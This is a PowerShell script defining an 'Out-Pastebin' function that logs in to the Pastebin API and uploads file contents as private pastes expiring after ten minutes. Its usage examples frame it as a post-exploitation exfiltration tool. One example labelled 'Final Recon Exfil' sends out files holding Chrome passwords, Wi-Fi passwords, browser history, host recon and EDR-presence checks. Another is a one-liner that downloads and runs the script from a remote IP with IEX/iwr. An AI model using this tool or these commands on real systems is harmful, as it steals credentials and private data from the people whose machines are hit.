<# 
.SYNOPSIS
    Authenticates to PasteBin.com, and uploads text data directly to the website
.DESCRIPTION
    Uses the PasteBin API to take content from a file and create a new paste from it, including expiration, format, visibility, and title.
.PARAMETER InputObject
    Content to paste to Pastebin
.PARAMETER Visibility
    Public, Private, or Unlisted visibility for the new paste
.PARAMETER Format
    The format of the paste for syntax highlighting
.PARAMETER ExpiresIn
    Never: N, 10 Minutes: 10M, 1 Hour: 1H, 1 Day: 1D, 1 Week: 1W, 2 Weeks: 2W, 1 Month: 1M
.PARAMETER PasteTitle
    Title text for the paste
.PARAMETER OpenInBrowser
    Open the paste URL in the default browser
.EXAMPLE
	Single file:
	Out-Pastebin -InputObject $(Get-Content C:\Users\Bank_Security\Desktop\to_be_uploaded.txt) -PasteTitle "TOP" -ExpiresIn 10M -Visibility Private

	Multiple files:
	Out-Pastebin -InputObject $(Get-Content C:\Users\Bank_Security\Desktop\to_be_uploaded.txt, C:\Users\Bank_Security\Desktop\to_be_uploaded2.txt) -PasteTitle "TOP" -ExpiresIn 10M -Visibility Private
	
	Final Recon Exfil:
	Out-Pastebin -InputObject $(Get-Content C:\Windows\Temp\Check_EDR_Presence.txt, C:\Windows\Temp\Host_Recon_Complete.txt, C:\Windows\Temp\Chorme_PW.txt, C:\Windows\Temp\Wifi_PW.txt, C:\Windows\Temp\Browsers_History.txt) -PasteTitle "Full_Recon_$env:computername" -ExpiresIn 10M -Visibility Private
	
	powershell.exe IEX (iwr http://172.16.217.130/Out-Pastebin.ps1); Out-Pastebin -InputObject $(Get-Content C:\Windows\Temp\Check_EDR_Presence.txt, C:\Windows\Temp\Host_Recon_Complete.txt, C:\Windows\Temp\Chorme_PW.txt, C:\Windows\Temp\Wifi_PW.txt, C:\Windows\Temp\Browsers_History.txt) -PasteTitle "Full_Recon_$env:computername" -ExpiresIn 10M -Visibility Private

#>

$PastebinDeveloperKey = 'xxxxxxxxxx'
$PastebinPasteURI = 'https://pastebin.com/api/api_post.php'
$PastebinLoginUri = "https://pastebin.com/api/api_login.php"
$PastebinUsername = "xxxxxxxx"
$PastebinPassword = "xxxxxxxx"

$Authenticate = "api_dev_key=$PastebinDeveloperKey&api_user_name=$PastebinUsername&api_user_password=$PastebinPassword"

Function Script:EncodeForPost ( [Hashtable]$KeyValues )
{
    @(  
        ForEach ( $KV in $KeyValues.GetEnumerator() )
        {
            "{0}={1}" -f @(
            $KV.Key, $KV.Value |
            ForEach-Object { [System.Web.HttpUtility]::UrlEncode( $_, [System.Text.Encoding]::UTF8 ) }
            )
        }
    ) -join '&'
}

Function Out-Pastebin
{
    [CmdletBinding()]
   
    Param
    (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [AllowEmptyString()]
        [String[]]
        $InputObject,
       
        [ValidateSet('Public', 'Unlisted', 'Private')]
        [String]
        $Visibility = 'Unlisted',
       
        # Specifies paste language
        [String]
        $Format,
       
        [ValidateSet('N', '10M', '1H', '1D', '1W', '2W', '1M')]
        [String]
        $ExpiresIn = '1D',

        [Parameter(Mandatory=$True)]
        [String]
        $PasteTitle,
       
        [Switch]
        $OpenInBrowser,
       
        [Switch]
        $PassThru
    )
   
    Begin
    {
        Add-Type -AssemblyName System.Web

        $script:s = Invoke-RestMethod -Uri $PastebinLoginUri -Body $Authenticate -Method Post
       
        $Post = [System.Net.HttpWebRequest]::Create( $PastebinPasteURI )
        $Post.Method = "POST"
        $Post.ContentType = "application/x-www-form-urlencoded"
       
        [String[]]$InputText = @()
    }
   
    Process
    {
        ForEach ( $Line in $InputObject )
        {
            $InputText += $Line
        }
    }
   
    End
    {
        $Parameters = @{
            api_user_key   = $script:s;
            api_dev_key    = $PastebinDeveloperKey;
            api_option     = 'paste';
            api_paste_code  = $InputText -join "`r`n";
            api_paste_name = $PasteTitle;
           
            api_paste_private = Switch($Visibility) { Public { '0' }; Unlisted { '1' }; Private { '2' }; };
            api_paste_expire_date = $ExpiresIn.ToUpper();
        }
       
        If ( $Format ) { $Parameters[ 'api_paste_format' ] = $Format.ToLower() }
       
        $Content = EncodeForPost $Parameters
       
        $Post.ContentLength = [System.Text.Encoding]::ASCII.GetByteCount( $Content )
       
        $WriteStream = New-Object System.IO.StreamWriter ( $Post.GetRequestStream( ), [System.Text.Encoding]::ASCII )
        $WriteStream.Write( $Content )
        $WriteStream.Close( )
       
        # Send request, get response
        $Response = $Post.GetResponse( )
        $ReadEncoding = [System.Text.Encoding]::GetEncoding( $Response.CharacterSet )
        $ReadStream = New-Object System.IO.StreamReader ( $Response.GetResponseStream( ), $ReadEncoding )
       
        $Result = $ReadStream.ReadToEnd().TrimEnd( )
       
        $ReadStream.Close( )
        $Response.Close( )
       
        If ( $Result.StartsWith( "http" ) ) {
            If ( $OpenInBrowser ) {
                Try { Start-Process -FilePath $Result } Catch { }
            } Else {
                $Result | clip.exe
            }
            
            $Result | Write-Output
        } Else {
            Throw "Error when uploading to pastebin: {0} : {1}" -f $Result, $Response
        }
    }
}
